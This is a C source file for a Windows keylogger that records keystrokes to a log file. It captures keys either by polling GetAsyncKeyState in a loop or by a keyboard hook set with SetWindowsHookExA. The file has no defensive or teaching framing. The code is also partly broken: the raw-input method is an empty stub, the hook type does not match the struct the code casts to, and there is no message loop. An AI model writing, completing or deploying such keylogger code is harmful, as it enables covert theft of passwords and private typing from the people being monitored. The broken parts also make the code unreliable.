#include "Header.h"

bool capital = false, numLock = false, shift = false;

int main(int argc, char* argv[]) {
	const char fileName[] = "Log.txt";

	//KeyLogger_GetAsyncKeyState(fileName);
	KeyLogger_SetWindowsHook(fileName);
}

void KeyLogger_GetAsyncKeyState(const char fileName[]) {
	while (1) {
		for (int i = 0; i < 255; i++) {
			int keystate = GetAsyncKeyState(i);
			if (keystate & 1) { // check key toggled
				LogKey(i);
			}

		}
		Sleep(10);
	}
}

void KeyLogger_RawInput(const char fileName[]) {

}

LRESULT CALLBACK hookFunction(int code, WPARAM wParam, LPARAM lParam) {
	if (code == HC_ACTION) {
		PKBDLLHOOKSTRUCT keystroke = (PKBDLLHOOKSTRUCT)lParam;
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
			LogKey(keystroke->vkCode);
		}
	}

	return CallNextHookEx(NULL, code, wParam, lParam);
}

void KeyLogger_SetWindowsHook(const char fileName[]) {
	HHOOK hook = SetWindowsHookExA(WH_KEYBOARD, hookFunction, NULL, 0);
	if (!hook) {
		printf("Failed to create hook\n");
		return;
	}

}
